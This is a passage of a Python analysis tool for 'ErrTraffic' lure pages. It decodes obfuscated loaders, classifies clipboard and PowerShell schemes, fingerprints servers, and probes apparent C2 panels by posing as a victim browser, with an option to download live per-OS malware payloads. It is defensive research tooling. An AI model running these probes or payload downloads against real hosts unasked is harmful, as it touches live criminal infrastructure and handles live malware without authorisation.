        out["signals"].append(f"host_in_known_panels:{host}")

    # Signal 2 — live probe of /api/index.php?a=init (the ErrTraffic v3 victim
    # init endpoint). Returns the canonical {"ok": true, "token": "<AES PS>"}
    # shape on real panels and 404 / HTML on lures. Retry once on transient
    # network errors (timeout, DNS hiccup, connection reset).
    origin = f"{p.scheme or 'https'}://{p.netloc or host}"
    probe_url = (f"{origin}/api/index.php?a=init&os=windows"
                 f"&src={quote(host, safe='')}&mode=cloudflare")
    headers = {"User-Agent": _BROWSER_UA,
               "Accept": "application/json, text/html, */*",
               "Referer": f"https://{host}/",
               "Origin":  f"https://{host}",
               "X-Requested-With": "XMLHttpRequest"}
    attempts = []
    att = None
    for try_i in range(1 + max(0, retries)):
        att = _http_get_safe(probe_url, headers, timeout, max_bytes=8192)
        attempts.append({
            "try":          try_i + 1,
            "status":       att["status"],
            "content_type": att["content_type"],
            "error":        att["error"],
            "bytes":        att["bytes"],
        })
        # If we got ANY HTTP response (status set) we're done — don't retry
        if att["status"] is not None:
            break
    out["probe"] = {
        "url":          probe_url,
        "attempts":     attempts,
        "status":       att["status"],
        "content_type": att["content_type"],
        "body_excerpt": (att["body_text_head"] or "")[:300],
        "error":        att["error"],
    }
    if att["status"] == 200 and att["body_bytes"]:
        try:    j = json.loads(att["body_bytes"])
        except Exception: j = None
        if isinstance(j, dict) and (j.get("token") or j.get("ok")):
            out["role"]       = "panel"
            out["confidence"] = max(out["confidence"], 0.90)
            out["signals"].append("init_endpoint_returns_token")
        else:
            # 200 but not the panel shape → almost certainly a lure
            out["confidence"] = max(out["confidence"], 0.45)
            out["signals"].append("init_endpoint_returns_non_token_200")
    elif att["status"] in (404, 403, 400, 401, 500):
        # No /api/index.php?a=init endpoint exposed → not a panel. Strong lure signal.
        if out["role"] != "panel":
            out["confidence"] = max(out["confidence"], 0.65)
            out["signals"].append(f"init_endpoint_http_{att['status']}")
    else:
        # Probe network-errored even after retry — we have nothing to go on.
        # Stay defaulted to "lure" with low conf so downstream still runs.
        out["signals"].append(f"probe_unreachable:{(att['error'] or 'unknown')[:80]}")
    return out


def investigate_ioc_comprehensive(url: str, args, progress_fh=None) -> dict:
    """Full pipeline for one IOC: fetch -> decode loader -> classify -> resolve
    contract -> server fingerprint -> WordPress detect -> CF detect -> AES
    decrypt -> optional payload download. Caches everything possible across
    invocations within the same process."""
    started = datetime.datetime.now(datetime.timezone.utc).isoformat(timespec="seconds").replace("+00:00", "Z")
    report: dict = {
        "schema_version": SCHEMA_VERSION, "tool": TOOL_VERSION,
        "mode": "comprehensive", "started_at": started,
        "ioc": {"input": url, "normalized": normalize_target(url) if not url.startswith(("http://","https://")) else url},
        "lure_page": {}, "contract_resolution": None, "server_fingerprint": None,
        "wordpress": None, "cloudflare": None, "aes_clipboard_recovery": None,
        "panel_payloads": None, "errors": [], "summary": {},
    }
    target = report["ioc"]["normalized"]

    # 0) Role classification — is this URL a LURE (compromised site running the
    # ErrTraffic loader) or a PANEL (the C2 itself)? Different downstream flow.
    if progress_fh: print(f"[comprehensive] classifying input role for {target}", file=progress_fh)
    role = classify_input_role(target, timeout=min(args.fetch_timeout, 8),
                                verify_tls=not args.no_tls_verify)
    report["input_role"] = role
    if progress_fh:
        print(f"[comprehensive]   role={role['role']} (conf {role['confidence']:.2f}) "
              f"signals={','.join(role['signals'])}", file=progress_fh)

    # ── PANEL-MODE PATH ───────────────────────────────────────────────────────
    # If the URL is a panel, skip lure-side decode and go straight to the panel
    # API. The user can still get the AES PowerShell from /api/index.php?a=init
    # per-OS and recover the binary directly.
    if role["role"] == "panel":
        if progress_fh: print(f"[comprehensive] PANEL detected — running panel-direct flow", file=progress_fh)
        report["mode"] = "comprehensive_panel"
        # Server fingerprint
        from urllib.parse import urlparse as _urlparse
        panel_host = _urlparse(target).hostname
        if panel_host:
            report["server_fingerprint"] = fingerprint_server(panel_host)
        # Probe + decrypt BW v2 envelopes (/api/cfg, /api/settings). Yields the
        # operator's live config in plaintext — mode (lure theme), enabled flag,
        # blockBots, rentalExpired, etc. — without ever running JS or contacting
        # the loader.
        report["envelope_recovery"] = probe_panel_envelopes(
            target, host=panel_host, timeout=args.fetch_timeout,
            verify_tls=not args.no_tls_verify, progress_fh=progress_fh)
        # Cloudflare detection on panel — we DO have headers now (we just probed)
        # so use them. But also check what we'd see for a normal GET.
        try:
            html, meta = fetch_url_passively(target, timeout=args.fetch_timeout,
                                              verify_tls=not args.no_tls_verify)
            report["panel_landing_response"] = {
                "status": meta.get("status"), "bytes": meta.get("bytes_received"),
                "content_type": meta.get("content_type"),
                "headers_subset": {k: v for k, v in (meta.get("headers") or {}).items()
                                   if k.lower() in ("server","cf-ray","cf-cache-status",
                                                    "content-type","set-cookie")},
            }
            report["cloudflare"] = detect_cloudflare(html or "", headers=meta.get("headers"),
                                                      ip_meta={"ip": (report["server_fingerprint"] or {}).get("ip"),
                                                               "cname": (report["server_fingerprint"] or {}).get("cname"),
                                                               "asn":  None})
            report["wordpress"]  = detect_wordpress(html or "", headers=meta.get("headers"))
        except Exception as e:
            report["errors"].append(f"panel landing fetch failed: {e}")
        # If --payload, recover binaries directly for each OS via init→AES→dl
        if args.payload:
            if progress_fh: print(f"[comprehensive] panel-direct --payload fetch", file=progress_fh)
            known_token = getattr(args, "payload_token", None)
            known_src   = getattr(args, "payload_src", None) or panel_host
            known_mode  = getattr(args, "payload_mode", None) or "cloudflare"
            _persist = bool(getattr(args, "payload_files", False) or getattr(args, "dump", None))
            report["panel_payloads"] = download_all_os_payloads(
                target, timeout=args.fetch_timeout,
                out_dir=(os.path.join(args.out or ".", "payloads") if (_persist and args.out) else None),
                progress_fh=progress_fh,
                known_token=known_token, known_src=known_src, known_mode=known_mode)
        # --detect-rotation in panel-direct mode
        if getattr(args, "detect_rotation", 0) > 0:
            if progress_fh: print(f"[comprehensive] --detect-rotation: "
                                  f"{args.detect_rotation} runs per OS",
                                  file=progress_fh)
            try:
                report["rotation_probe"] = detect_rotation_for_panel(
                    target, runs=args.detect_rotation, timeout=args.fetch_timeout,
                    src=panel_host, mode="cloudflare", progress_fh=progress_fh)
            except Exception as e:
                report["errors"].append(f"rotation probe failed: {e}")
        # Minimal summary block
        report["summary"] = {
            "input_role":         "panel",
            "input_role_confidence": role["confidence"],
            "panel_url":          target,
            "panel_url_defanged": _defang(target),
            "panel_is_wordpress": (report.get("wordpress") or {}).get("is_wp", False),
            "panel_behind_cf":    (report.get("cloudflare") or {}).get("behind_cf", False),
            "panel_cf_signals":   len((report.get("cloudflare") or {}).get("signals") or []),
            "payload_oses_recovered": (sorted(report["panel_payloads"]["meta"]["successful_os"])
                                        if report.get("panel_payloads") else []),
            "actor_attribution_caveat":  ("Input classified as ErrTraffic panel; no lure-side "
                                          "EtherHiding decode performed (the panel IS the C2). "
                                          "Use --payload to recover the per-OS clipboard PS + binary."),
        }
        return report

    # ── LURE-MODE PATH (default) ──────────────────────────────────────────────
    # 1) Fetch the lure
    if progress_fh: print(f"[comprehensive] fetching {target}", file=progress_fh)
    try:
        html, meta = fetch_url_passively(target, timeout=args.fetch_timeout,
                                          verify_tls=not args.no_tls_verify)
    except Exception as e:
        # Graceful degradation — preserve what we DO have (input URL, role probe,
        # any errors) instead of returning a near-empty report. Skip lure-side
        # analysis but still try the panel-side flow if --payload + role hints panel.
        report["errors"].append(f"lure fetch failed: {e}")
        # Try server fingerprint anyway — DNS + ports might still resolve
        from urllib.parse import urlparse as _urlparse
        _h = _urlparse(target).hostname
        if _h:
            try: report["server_fingerprint"] = fingerprint_server(_h)
            except Exception as fp_e: report["errors"].append(f"fingerprint failed: {fp_e}")
        # Minimum summary so the renderer doesn't print "None" headers
        report["summary"] = {
            "lure_url":                  target,
            "lure_is_wordpress":         False,
            "lure_wordpress_confidence": 0.0,
            "lure_behind_cf":            False,
            "lure_cf_signals":           0,
            "panel_url":                 None,
            "panel_url_defanged":        None,
            "panel_behind_cf":           None,
            "panel_cf_signals":          0,
            "classifications":           [],
            "actors_attributed":         [],
            "actor_attribution_caveat":  "",
            "resolved_c2":               [],
            "clipboard_aes_recovered":   False,
            "clipboard_aes_caveat":      "",
            "payload_oses_recovered":    [],
            "fetch_status":              "FAILED",
            "fetch_failure_reason":      str(e)[:200],
            "site_likely_state":         ("Lure may be down, blocked, or has rotated to a new "
                                           "host. Site may have been taken down, the operator may "
                                           "have moved on, or the lure could be IP-gating us. "
                                           "Try a fresh IP, a different lure URL, or re-check later."),
        }
        return report
    meta["source_type"] = "url"
    # 2) Static decode + classify
    base_report = analyze_html(target, html, meta,
                                max_depth=args.max_depth, outdir=args.out,
                                resolve_chain=True, rpc_override=args.rpc_url,
                                rpc_timeout=args.rpc_timeout)
    report["lure_page"] = base_report
    # 3) Server fingerprint of the lure host
    from urllib.parse import urlparse
    lure_host = urlparse(target).hostname
    if lure_host:
        if progress_fh: print(f"[comprehensive] fingerprinting {lure_host}", file=progress_fh)
        report["server_fingerprint"] = fingerprint_server(lure_host)
    # 4) WordPress + Cloudflare detection on the lure (using real response headers)
    response_headers = meta.get("headers") or {}
    report["wordpress"]  = detect_wordpress(html, headers=response_headers)
    report["cloudflare"] = detect_cloudflare(html, headers=response_headers,
                                              ip_meta={"ip": report["server_fingerprint"].get("ip"),
                                                       "cname": report["server_fingerprint"].get("cname"),
                                                       "asn":  None})
    # 4b) WordPress backdoor probe — passive probe of /wp-content/mu-plugins/...
    # paths per LevelBlue 2026 + Sucuri 2025. Only runs when WP is detected
    # (skips wasted probes on non-WP sites).
    report["wp_backdoor_probe"] = None
    if report["wordpress"].get("is_wp"):
        from urllib.parse import urlparse as _urlparse
        _o = _urlparse(target)
        origin = f"{_o.scheme}://{_o.netloc}"
        if progress_fh: print(f"[comprehensive] probing mu-plugins backdoor paths on {lure_host}",
                              file=progress_fh)
        try:
            report["wp_backdoor_probe"] = probe_wordpress_backdoor(
                origin, timeout=min(args.fetch_timeout, 8),
                verify_tls=not args.no_tls_verify)
        except Exception as e:
            report["errors"].append(f"backdoor probe failed: {e}")
    # 5) AES clipboard recovery from each recovered loader
    aes_recovery = []
    for group in base_report.get("groups", []):
        # We need the recovered JS text; analyze_html doesn't ship it back inline
        # (only size + path). Re-read from disk if saved.
        js_path = group.get("recovered_js_path")
        if js_path and os.path.isfile(js_path):
            try:
                js_text = open(js_path, encoding="utf-8", errors="replace").read()
                rec = try_recover_clipboard_aes(js_text)
                if rec: aes_recovery.append({"group_hash": group["group_hash"], **rec})
            except Exception as e:
                aes_recovery.append({"group_hash": group["group_hash"], "ok": False,
                                     "reason": f"file read: {e}"})
    if aes_recovery: report["aes_clipboard_recovery"] = aes_recovery
    # 6) Identify panel URL — from the on-chain resolved URL OR from the AES plaintext
    panel_url = None
    for g in base_report.get("groups", []):
        for cls in g.get("classifications", []):
            r = cls.get("resolved") or {}
            if r.get("decoded_url"):
                panel_url = r["decoded_url"]
                if not panel_url.startswith(("http://","https://")):
                    panel_url = "https://" + panel_url
                break
        if panel_url: break
    if not panel_url and aes_recovery:
        for rec in aes_recovery:
            if rec.get("errtraffic_payload_url"):
                panel_url = "https://" + rec["errtraffic_payload_url"]["host"]
                break
    # 7) If --payload, download safely. Prefer an AES-recovered (token, src, mode)
    # triple if we have one — that lets us hit /api/index.php?a=dl directly with
    # a real server-issued token, no mint chain required.
    if args.payload and panel_url:
        if progress_fh: print(f"[comprehensive] --payload fetch from {panel_url}", file=progress_fh)
        # Priority order for (token, src, mode):
        #   1) CLI overrides (--payload-token / --payload-src / --payload-mode)
        #   2) AES-recovered triple from this same investigation
        #   3) None (mint chain will be tried)
        known_token = getattr(args, "payload_token", None)
        known_src   = getattr(args, "payload_src", None)
        known_mode  = getattr(args, "payload_mode", None) or "cloudflare"
        if not known_token:
            for rec in (aes_recovery or []):
                ehp = (rec or {}).get("errtraffic_payload_url") or {}
                if ehp.get("token"):
                    known_token = ehp.get("token")
                    known_src   = known_src or ehp.get("src") or urlparse(target).hostname
                    known_mode  = ehp.get("mode") or known_mode
                    break
        if not known_src:
            known_src = urlparse(target).hostname
        _persist = bool(getattr(args, "payload_files", False) or getattr(args, "dump", None))
        report["panel_payloads"] = download_all_os_payloads(
            panel_url, timeout=args.fetch_timeout,
            out_dir=(os.path.join(args.out or ".", "payloads") if (_persist and args.out) else None),
            progress_fh=progress_fh,
            known_token=known_token, known_src=known_src, known_mode=known_mode)
    # 7b) --detect-rotation: re-fetch init N times per OS to characterize
    # whether the kit serves polymorphic responses.
    if getattr(args, "detect_rotation", 0) > 0 and panel_url:
        if progress_fh: print(f"[comprehensive] --detect-rotation: "
                              f"{args.detect_rotation} runs per OS against {panel_url}",
                              file=progress_fh)
        try:
            report["rotation_probe"] = detect_rotation_for_panel(
                panel_url, runs=args.detect_rotation, timeout=args.fetch_timeout,
                src=known_src or urlparse(target).hostname, mode=known_mode or "cloudflare",
                progress_fh=progress_fh)
        except Exception as e:
            report["errors"].append(f"rotation probe failed: {e}")
    # 8) Server fingerprint of the panel (+ best-effort CF detection on the panel)
    report["panel_server_fingerprint"] = None
    report["panel_cloudflare"] = None
    if panel_url:
        panel_host = urlparse(panel_url).hostname
        if panel_host and panel_host != lure_host:
            if progress_fh: print(f"[comprehensive] fingerprinting panel {panel_host}",
                                  file=progress_fh)
            pfp = fingerprint_server(panel_host)
            report["panel_server_fingerprint"] = pfp
            # CF detection on panel — when --payload ran we already hit the
            # panel and have its response headers. Use those for FULL CF
            # detection (5 signals). Otherwise fall back to IP/CNAME-only (1).
            panel_headers = None
            panel_body    = ""
            if report.get("panel_payloads"):
                for _, r in (report["panel_payloads"].get("per_os") or {}).items():
                    for att in (r.get("token_attempts") or []):
                        if att.get("phase") == "mint" and att.get("status") == 200:
                            # _http_get_safe stashes response headers — reach in via
                            # a second probe to the same endpoint (cheap; cached
                            # at the panel side) to harvest CF headers properly.
                            from urllib.parse import quote
                            probe = _http_get_safe(
                                att["url"],
                                {"User-Agent": _BROWSER_UA,
                                 "Accept": "application/json, text/html, */*",
                                 "Referer": f"https://{(known_src or panel_host)}/",
                                 "Origin":  f"https://{(known_src or panel_host)}",
                                 "X-Requested-With": "XMLHttpRequest"},
                                args.fetch_timeout, max_bytes=4096)
                            if probe.get("response_headers"):
                                panel_headers = probe["response_headers"]
                                panel_body    = probe.get("body_text_head") or ""
                                break
                    if panel_headers: break
            report["panel_cloudflare"] = detect_cloudflare(
                panel_body, headers=panel_headers,
                ip_meta={"ip": pfp.get("ip"), "cname": pfp.get("cname"), "asn": None})

    # 9) Summary — collect the critical IOCs from every layer into one block
    # so the analyst doesn't have to dig through 10 loader sections.
    schemes = base_report.get("summary", {}).get("schemes_seen", [])
    actors  = base_report.get("summary", {}).get("actors_attributed", [])
    resolved = base_report.get("summary", {}).get("resolved_next_stage_urls", [])
    # Extract contract + selector + dl-token + AES PS hashes
    contracts = []
    selectors = []
    for g in base_report.get("groups", []):
        for c in g.get("classifications", []):
            if c.get("scheme") == "etherhiding":
                for a in (c.get("contract_addresses") or []):
                    if a not in contracts: contracts.append(a)
                sel = c.get("method_selector")
                if sel and sel not in selectors: selectors.append(sel)
    dl_tokens         = []
    aes_ps_hashes     = []
    decrypted_hashes  = []
    payload_hashes    = []
    panel_origin      = None
    for o, r in ((report.get("panel_payloads") or {}).get("per_os") or {}).items():
        if r.get("token") and r["token"] not in dl_tokens: dl_tokens.append(r["token"])
        if r.get("init_response_aes_ps_sha256"):
            aes_ps_hashes.append(r["init_response_aes_ps_sha256"])
        ird = r.get("init_response_aes_decrypt") or {}
        if ird.get("plaintext_sha256"):
            decrypted_hashes.append(ird["plaintext_sha256"])
        if r.get("sha256") and r["sha256"] not in payload_hashes:
            payload_hashes.append(r["sha256"])
        if r.get("panel_origin"): panel_origin = r["panel_origin"]
    report["summary"] = {
        "lure_url":                  target,
        "lure_is_wordpress":         report["wordpress"]["is_wp"],
        "lure_wordpress_confidence": report["wordpress"]["confidence"],
        "lure_behind_cf":            report["cloudflare"]["behind_cf"],
        "lure_cf_signals":           len(report["cloudflare"].get("signals") or []),
        "panel_url":                 panel_url,
        "panel_url_defanged":        _defang(panel_url) if panel_url else None,
        "panel_behind_cf":           (report.get("panel_cloudflare") or {}).get("behind_cf"),
        "panel_cf_signals":          len((report.get("panel_cloudflare") or {}).get("signals") or []),
        # Critical IOCs surfaced at SUMMARY level
        "contract_addresses":        contracts,
        "method_selectors":          selectors,
        "controller_wallet":         None,  # filled by --investigate-contract when run
        "download_tokens":           dl_tokens,
        "distinct_aes_ps_hashes":    sorted(set(aes_ps_hashes)),
        "distinct_decrypted_hashes": sorted(set(decrypted_hashes)),
        "distinct_payload_hashes":   sorted(set(payload_hashes)),
        "classifications":           schemes,
        "actors_attributed":         actors,
        "actor_attribution_caveat":  ("Contract-address match against KNOWN_ACTORS table gives high "
                                      "confidence that the loader belongs to the named kit. Surrounding "
                                      "kit details (hosting / registrar / TTPs) are CTI from public reports — "
                                      "they describe the kit in general, NOT verified for THIS target."),
        "resolved_c2":               resolved,
        "clipboard_aes_recovered":   bool(aes_recovery and any(r.get("ok") for r in aes_recovery)),
        "clipboard_aes_caveat":      ("The AES blobs typically live in the SERVER response from the "
                                      "C2 panel (fetched at runtime), NOT in the on-page loader. "
                                      "'recovered: False' here means the loader-side static decode "
                                      "didn't see them — it does NOT mean the kit isn't AES-encrypting "
                                      "its clipboard payload. If you can complete the CAPTCHA in a "
                                      "FlareVM browser, capture the AES PowerShell from the clipboard, "
                                      "extract its token, and re-run with --payload-token <HEX> "
                                      "--payload-src <lure-domain> to download the binary."),
        "payload_oses_recovered": (sorted(report["panel_payloads"]["meta"]["successful_os"])
                                    if report.get("panel_payloads") else []),
    }
    return report


# ============================================================================
# Input handling
# ============================================================================
def _looks_like_target(s: str) -> bool:
    s = _refang(s.strip().lstrip('-*•·').strip())
    if not s: return False
    if s.startswith(("http://", "https://")): return True
    return bool(re.match(r'^(?:[a-zA-Z0-9][a-zA-Z0-9-]{0,62}\.)+[a-zA-Z]{2,24}(?:[:/].*)?$', s))


def normalize_target(s: str) -> str:
    """Refang + scheme-prepend a single target line. 'example[.]com' -> 'https://example.com/'."""
    s = _refang(s.strip().lstrip('-*•·').strip())
    if not s.startswith(("http://", "https://")):
        s = "https://" + s
    if "://" in s and s.rstrip().endswith(s.split("://", 1)[1].split("/", 1)[0]):
        s = s + "/"      # bare-domain: append /
    return s


def is_target_list_file(path: str) -> bool:
    """A target-list file: small text file containing newline-separated
    URLs/domains, no JSON/HTML markers in the first 64KB."""
    if not os.path.isfile(path): return False
    if path.lower().endswith((".json", ".html", ".htm")): return False
    try:
        with open(path, "rb") as fh:
            head = fh.read(64 * 1024)
    except OSError: return False
    if not head: return False
    lowered = head.lower()
    if b"<html" in lowered or b"<!doctype" in lowered or b"<script" in lowered: return False
    if head.lstrip().startswith((b"{", b"[")): return False
    sample = head.decode("utf-8", errors="replace").splitlines()[:20]
    non_blank = [l for l in sample if l.strip() and not l.strip().startswith("#")]
    if not non_blank: return False
    hits = sum(1 for l in non_blank if _looks_like_target(l))
    return hits / max(1, len(non_blank)) >= 0.8


def read_target_list(path: str) -> list[str]:
    """Parse a target-list file (skip blanks + # comments + de-dup)."""
    seen, out = set(), []
    with open(path, encoding="utf-8", errors="replace") as fh:
        for raw in fh:
            line = raw.strip()
            if not line or line.startswith("#"): continue
            norm = normalize_target(line)
            if norm in seen: continue
            seen.add(norm); out.append(norm)
    return out


def detect_input_kind(s: str) -> str:
    if s == "-": return "stdin"
    if s.startswith(("http://", "https://")): return "url"
    # bare domain like "example.com" or "example[.]com" → treat as URL target
    if _looks_like_target(s) and not os.path.exists(s): return "domain"
    if os.path.isdir(s): return "directory"
    if not os.path.isfile(s): return "html_file"
    if is_target_list_file(s): return "target_list"
    if s.lower().endswith((".html", ".htm")): return "html_file"
    if s.lower().endswith(".json"): return "clickgrab_json"
    with open(s, "rb") as fh:
        head = fh.read(512).lstrip().lower()
    if head.startswith(b"{") or head.startswith(b"["): return "clickgrab_json"
    if b"<html" in head or b"<!doctype" in head or b"<script" in head: return "html_file"
    return "html_file"


def iter_inputs(path: str, fetch_timeout: int, verify_tls: bool):
    """Yield (source_type, label, html_text, meta_dict). For batch sources
    (directory, target_list), yields one per discovered item but DOES NOT do
    URL fetching itself — that is the batch driver's job (so it can parallelize).
    URL/domain single inputs DO fetch here."""
    kind = detect_input_kind(path)
    if kind == "stdin":
        html = sys.stdin.read()
        yield ("stdin", "<stdin>", html, {"bytes": len(html)}); return
    if kind in ("url", "domain"):
        target = normalize_target(path) if kind == "domain" else path
        try:
            html, meta = fetch_url_passively(target, timeout=fetch_timeout, verify_tls=verify_tls)
            yield ("url", target, html, meta); return
        except (urllib.error.HTTPError, urllib.error.URLError, ConnectionError,
                TimeoutError, ssl.SSLError, OSError) as e:
            desc = _describe_fetch_exception(e, target, fetch_timeout=fetch_timeout,
                                             verify_tls=verify_tls)
            # Yield a sentinel telling the caller to emit a fetch_error report
            # instead of running analyze_html on empty HTML.
            yield ("fetch_error", target, "",
                   {"source_type": "url", "fetch_error_desc": desc}); return
    if kind == "directory":
        for root, _d, files in os.walk(path):
            for f in sorted(files):
                if f.lower().endswith((".html", ".htm", ".json")):
                    yield from iter_inputs(os.path.join(root, f), fetch_timeout, verify_tls)
        return
    if kind == "target_list":
        # NOTE: don't fetch here — emit deferred fetch jobs; the driver fetches
        for t in read_target_list(path):
            yield ("deferred_url", t, "", {"deferred": True}); return  # bug fix below
        return
    if kind == "html_file":
        with open(path, encoding="utf-8", errors="replace") as fh:
            yield ("html_file", os.path.basename(path), fh.read(),
                   {"path": os.path.abspath(path)}); return
    if kind == "clickgrab_json":
        try:
            with open(path, encoding="utf-8", errors="replace") as fh:
                data = json.load(fh)
        except Exception as e:
            yield ("error", path, "", {"error": f"cannot parse: {e}"}); return
        sites = data.get("sites") if isinstance(data, dict) else (data if isinstance(data, list) else [])
        if not sites and isinstance(data, dict): sites = [data]
        for s in sites or []:
            url = s.get("URL") or s.get("url") or s.get("domain") or "?"
            html = s.get("RawHTML") or s.get("raw_html") or s.get("html") or ""
            if html:
                yield ("clickgrab_json", url, html, {"clickgrab_path": os.path.abspath(path)})
            else:
                blobs = []
                for b in (s.get("Base64Strings") or []):
                    v = b.get("Base64") if isinstance(b, dict) else b
                    if v: blobs.append(f'x=atob("{v}");')
                for b in (s.get("ObfuscatedJavaScript") or []):
                    v = b.get("code") if isinstance(b, dict) else b
                    if v: blobs.append(str(v))
                if blobs:
                    yield ("clickgrab_json_blobs",
                           url + " (no RawHTML; using saved blobs)",
                           "<script>" + "\n".join(blobs) + "</script>",
                           {"clickgrab_path": os.path.abspath(path)})
                else:
                    yield ("clickgrab_json_empty", url, "",
                           {"clickgrab_path": os.path.abspath(path),
                            "warning": "no RawHTML, no saved blobs"})


# ============================================================================
# Pure analyzer
# ============================================================================
def _short_hash(s: str) -> str:
    return hashlib.sha256(s.encode("utf-8", "replace")).hexdigest()[:12]


def _group_verdict(classifications: list[dict]) -> str:
    schemes = {c["scheme"] for c in classifications}
    if {"clipboard_payload", "aes_kit", "powershell_command", "bw_v2_launcher"} & schemes: return "payload"
    if {"etherhiding", "tds_beacon"} & schemes: return "next_stage_loader"
    return "decoded" if classifications else "no_decode"


def analyze_html(label: str, html: str, source_meta: dict, *, max_depth: int = 8,
                 outdir: str | None = None, resolve_chain: bool = False,
                 rpc_override: str | None = None, rpc_timeout: int = DEFAULT_RPC_TIMEOUT,
                 ) -> dict:
    report: dict[str, Any] = {
        "schema_version": SCHEMA_VERSION, "tool": TOOL_VERSION,
        "input": {"label": label, "source": source_meta},
        "page": {}, "groups": [], "summary": {}, "errors": [],
    }
    if not html:
        report["errors"].append("empty html")
        report["summary"] = {"verdict": "no_input", "obfuscated_blocks": 0,
                             "distinct_groups": 0, "schemes_seen": []}
        return report

    injected_srcs = [_defang(m.group(1)) for m in _RE_SCRIPTSRC.finditer(html)]
    scripts = _RE_SCRIPT.findall(html)
    obf = [s for s in scripts if is_obfuscated(s)]
    page_ns = scrape_namespace("\n".join(scripts))
    # Compute byte offsets + 1-indexed line numbers for each inline <script>
    # so analysts can find them in browser DevTools.
    script_positions = []
    for m in _RE_SCRIPT_POS.finditer(html):
        char_off = m.start()
        line     = html.count("\n", 0, char_off) + 1
        # tag if the script body it opens is obfuscated
        body_start = m.end()
        body_end   = html.find("</script>", body_start)
        body = html[body_start:body_end] if body_end > 0 else ""
        script_positions.append({
            "char_offset": char_off, "line": line,
            "is_obfuscated": is_obfuscated(body),
            "body_size": len(body),
            "body_head":  body.strip()[:80].replace("\n", " "),
        })
    report["page"] = {
        "injected_script_srcs":      injected_srcs,
        "inline_script_blocks":      len(scripts),
        "obfuscated_loader_blocks":  len(obf),
        "inline_script_positions":   script_positions,
    }
    decoded_groups: dict[str, dict] = {}
    for idx, code in enumerate(obf):
        final, methods = decode_chain(_html.unescape(code), page_ns, max_depth)
        key = _short_hash(final)
        if key not in decoded_groups:
            decoded_groups[key] = {
                "group_hash": key, "block_indexes": [], "decode_layers": methods,
                "classifications": classify(final), "iocs": extract_loose_iocs(final),
                "recovered_js": final, "recovered_js_path": None,
            }
        decoded_groups[key]["block_indexes"].append(idx)

    # Also run classifiers across ALL inline-script text (not just obfuscated
    # blocks). Catches plaintext clipboard launchers, plaintext PowerShell, and
    # TDS beacons that sit inside non-obfuscated <script> bodies — important
    # for ErrTraffic v3 (BW v2 generation) which dropped the clipboard-AES
    # wrap and ships a plaintext Invoke-WebRequest launcher.
    plain_text = "\n".join(scripts)
    if plain_text.strip():
        plain_cls = classify(_html.unescape(plain_text))
        # Only emit a synthetic "plaintext_scripts" group when classifiers
        # actually found something (so we don't litter the report on every page).
        if plain_cls:
            # De-dupe against schemes already produced from obfuscated decode
            existing_schemes = {c["scheme"] for g in decoded_groups.values()
                                            for c in g["classifications"]}
            novel = [c for c in plain_cls if c["scheme"] not in existing_schemes]
            if novel:
                key = _short_hash("plaintext::" + plain_text[:2000])
                decoded_groups[key] = {
                    "group_hash":      key,
                    "block_indexes":   [],          # synthetic group, no specific block
                    "decode_layers":   [{"scheme": "plaintext_scripts",
                                          "info": f"classified {len(scripts)} inline <script> body(ies) "
                                                  f"as plaintext (no obfuscation detected)"}],
                    "classifications": novel,
                    "iocs":            extract_loose_iocs(plain_text),
                    "recovered_js":    plain_text,
                    "recovered_js_path": None,
                }

    if outdir:
        os.makedirs(outdir, exist_ok=True)
        safe = re.sub(r'[^A-Za-z0-9._-]', '_', label)[:60]
        for key, g in decoded_groups.items():
            if g["decode_layers"] and g["decode_layers"][0]["scheme"] != "[stop]":
                fn = os.path.join(outdir, f"{safe}.group_{key}.recovered.js")
                with open(fn, "w", encoding="utf-8") as fh: fh.write(g["recovered_js"])
                g["recovered_js_path"] = fn

    if resolve_chain:
        for g in decoded_groups.values():
            for cls in g["classifications"]:
                if cls["scheme"] == "etherhiding":
                    cls["resolved"] = resolve_etherhiding(cls, override_rpc=rpc_override,
                                                         timeout=rpc_timeout)

    for g in decoded_groups.values():
        g["verdict"] = _group_verdict(g["classifications"])
        g["recovered_js_size"] = len(g.pop("recovered_js"))
    report["groups"] = list(decoded_groups.values())

    schemes_seen = sorted({c["scheme"] for g in decoded_groups.values()
                                       for c in g["classifications"]})
    attrs, attr_seen, resolved_urls, resolved_seen = [], set(), [], set()
    for g in decoded_groups.values():
        for c in g["classifications"]:
            if c["scheme"] == "etherhiding" and c.get("actor_attribution"):
                a = c["actor_attribution"]
                key = (a["name"], a["confidence"])
                if key not in attr_seen:
                    attr_seen.add(key)
                    attrs.append({"name": a["name"], "confidence": a["confidence"],
                                  "sources": a["sources"]})
            r = c.get("resolved") or {}
            if r.get("ok") and r.get("decoded_url") and r["decoded_url"] not in resolved_seen:
                resolved_seen.add(r["decoded_url"]); resolved_urls.append(r["decoded_url"])

    if {"clipboard_payload", "aes_kit", "powershell_command", "bw_v2_launcher"} & set(schemes_seen):
        verdict = "clipboard_or_powershell_payload"
    elif "etherhiding" in schemes_seen: verdict = "etherhiding_loader"
    elif "tds_beacon" in schemes_seen:  verdict = "tds_beacon_only"
    elif schemes_seen:                  verdict = "scaffolding_only"
    else:                               verdict = "nothing_recovered"

    report["summary"] = {
        "obfuscated_blocks":         len(obf),
        "distinct_groups":           len(decoded_groups),
        "schemes_seen":              schemes_seen,
        "verdict":                   verdict,
        "actors_attributed":         attrs,
        "resolved_next_stage_urls":  [_defang(u) for u in resolved_urls],
    }
    return report


# ============================================================================
# Renderers
# ============================================================================
def render_text(report: dict, fh=sys.stdout, *, quiet: bool = False):
    p = fh.write
    label = report["input"]["label"]

    # ── Fast-path: fetch-error reports get their own concise panel ───────────
    # Instead of dumping an empty decode result, show the analyst:
    #   - what failed (HTTP code / error class)
    #   - what category (http / dns / tls / timeout / connect)
    #   - an actionable hint (e.g. "looks like a panel, try --comprehensive")
    summary = report.get("summary") or {}
    fe = summary.get("fetch_error")
    if summary.get("verdict") == "fetch_error" and fe:
        p("\n" + "=" * 80 + "\n")
        p(f" [fetch failed]  {label}\n")
        p("=" * 80 + "\n")
        msg = fe.get("message") or (report.get("errors") or ["?"])[0]
        cat = fe.get("category") or "other"
        st  = fe.get("status")
        cat_str = f"  [{cat.upper()}{(' '+str(st)) if st else ''}]"
        p(f"  error:    {msg}{cat_str}\n")
        pp = fe.get("panel_probe")
        if pp:
            p(f"  panel-probe:  role={pp.get('role')}  "
              f"confidence={pp.get('confidence')}  "
              f"signals={','.join(pp.get('signals') or [])}\n")
        if fe.get("hint"):
            p("\n  hint:\n")
            # Wrap the hint to 76 cols for readability
            import textwrap
            for line in textwrap.wrap(fe["hint"], width=76,
                                       initial_indent="    ", subsequent_indent="    "):
                p(line + "\n")
        p("\n")
        return

